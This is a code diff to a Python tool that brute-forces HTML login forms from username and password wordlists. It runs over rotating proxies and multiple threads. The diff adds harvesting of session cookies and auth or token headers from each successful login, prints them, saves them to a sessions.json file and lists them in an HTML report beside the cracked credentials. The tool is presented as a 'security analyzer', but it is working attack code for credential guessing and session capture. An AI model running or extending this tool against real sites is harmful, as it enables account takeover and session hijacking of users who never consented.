@@ -106,7 +106,7 @@ def parse_cookies(cookie_arg):
     return cookies
 
 def test_form_auth(session, target_url, username, password, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, delay=0, lockout_keyword=None, verbose=False):
-    """Tests HTML Form-Based Authentication with timing tracking and response size metrics."""
+    """Tests HTML Form-Based Authentication with session harvesting and response size metrics."""
     headers = base_headers.copy()
     if "Content-Type" not in headers:
         headers["Content-Type"] = "application/x-www-form-urlencoded"
@@ -164,6 +164,10 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
             elif not failure_keyword and resp.status_code == 302:
                 is_success = True
 
+        # Harvest cookies and headers from response session state
+        captured_cookies = {c.name: c.value for c in resp.cookies}
+        captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()}
+
         result = {
             "username": username,
             "password": password,
@@ -172,13 +176,19 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
             "status_code": resp.status_code,
             "response_time": elapsed,
             "response_length": resp_length,
-            "success": is_success
+            "success": is_success,
+            "session_cookies": captured_cookies,
+            "session_headers": captured_headers
         }
 
         if is_success:
-            print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url}\n")
+            print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url}")
+            if captured_cookies:
+                print(f"    [+] Harvested Cookies: {captured_cookies}")
+            if captured_headers:
+                print(f"    [+] Harvested Auth Headers: {captured_headers}\n")
         elif verbose:
-            print(f"[-] Failed form login {username}:{password} at {target_url} (Status: {resp.status_code}, Length: {resp_length}B, Time: {elapsed:.3f}s)")
+            print(f"[-] Failed form login {username}:{password} at {target_url} (Status: {resp.status_code}, Length: {resp_length}B)")
 
         return result
 
@@ -222,7 +232,6 @@ def analyze_timing_leak(all_results):
     else:
         print("    [+] No significant timing anomalies detected across usernames.")
     print("="*60)
-    
     return vulnerabilities
 
 def analyze_length_outliers(all_results):
@@ -258,15 +267,16 @@ def analyze_length_outliers(all_results):
     return outliers
 
 def export_html_report(findings, timing_vulns, length_outliers, report_path, metadata):
-    """Generates a professional, styled HTML security report including timing and length anomaly sections."""
+    """Generates a professional, styled HTML security report including session state details."""
     rows_html = ""
     for item in findings:
+        cookies_str = str(item.get('session_cookies', {})).replace("{", "").replace("}", "")
         rows_html += f"""
         <tr>
             <td><code>{item['username']}</code></td>
             <td><code>{item['password']}</code></td>
             <td><a href="{item['endpoint']}" target="_blank">{item['endpoint']}</a></td>
-            <td><span class="badge {item['type']}">{item['type'].upper()}</span></td>
+            <td><code>{cookies_str if cookies_str else 'N/A'}</code></td>
             <td><code>{item['status_code']}</code></td>
         </tr>
         """
@@ -405,13 +415,6 @@ def export_html_report(findings, timing_vulns, length_outliers, report_path, met
             border-radius: 4px;
             font-family: monospace;
         }
-        .badge {
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        .badge.form { background: #7c3aed; color: #fff; }
         .no-findings {
             text-align: center;
             color: var(--text-muted);
@@ -445,14 +448,14 @@ def export_html_report(findings, timing_vulns, length_outliers, report_path, met
             </div>
         </div>
 
-        <h2>Discovered Credentials</h2>
+        <h2>Discovered Credentials & Harvested Sessions</h2>
         <table>
             <thead>
                 <tr>
                     <th>Username</th>
                     <th>Password</th>
                     <th>Endpoint</th>
-                    <th>Type</th>
+                    <th>Harvested Session Cookies</th>
                     <th>Status</th>
                 </tr>
             </thead>
@@ -527,7 +530,9 @@ def run_analysis(args):
                         "password": res['password'],
                         "endpoint": res['endpoint'],
                         "type": res['type'],
-                        "status_code": res['status_code']
+                        "status_code": res['status_code'],
+                        "session_cookies": res['session_cookies'],
+                        "session_headers": res['session_headers']
                     })
 
     timing_vulns = []
@@ -541,7 +546,7 @@ def run_analysis(args):
     return valid_credentials, timing_vulns, length_outliers
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Length Clustering & Timing Analysis")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Session Persistence")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("--auth-type", choices=["form"], default="form", help="Authentication type to test")
     parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
@@ -554,8 +559,9 @@ if __name__ == "__main__":
     parser.add_argument("-H", "--header", action="append", help="Custom HTTP header")
     parser.add_argument("--cookie", help="Custom cookies string")
     parser.add_argument("--delay", type=float, default=0.0, help="Base delay in seconds")
-    parser.add_argument("--timing-analysis", action="store_true", help="Enable side-channel timing-based user enumeration analysis")
-    parser.add_argument("--detect-length-outliers", action="store_true", help="Enable response length clustering to detect structural anomalies")
+    parser.add_argument("--timing-analysis", action="store_true", help="Enable side-channel timing analysis")
+    parser.add_argument("--detect-length-outliers", action="store_true", help="Enable response length clustering")
+    parser.add_argument("--save-session", default="sessions.json", help="File to save harvested session cookies and tokens")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads")
     parser.add_argument("--proxy", help="Route traffic through static proxy")
     parser.add_argument("--proxy-file", help="Path to proxy list file")
@@ -574,10 +580,16 @@ if __name__ == "__main__":
     duration_str = f"{duration.total_seconds():.2f}s"
     print(f"\n[+] Scan Complete in {duration_str}. Total valid items found: {len(found)}")
 
-    if args.output and found:
-        with open(args.output, 'w', encoding='utf-8') as f:
-            json.dump(found, f, indent=4)
-        print(f"[*] Results successfully exported to JSON: {args.output}")
+    if found:
+        if args.output:
+            with open(args.output, 'w', encoding='utf-8') as f:
+                json.dump(found, f, indent=4)
+            print(f"[*] Results successfully exported to JSON: {args.output}")
+
+        if args.save_session:
+            with open(args.save_session, 'w', encoding='utf-8') as f:
+                json.dump([{ "username": item["username"], "cookies": item["session_cookies"], "headers": item["session_headers"] } for item in found], f, indent=4)
+            print(f"[*] Harvested session state successfully saved to: {args.save_session}")
 
     if args.report:
         metadata = {
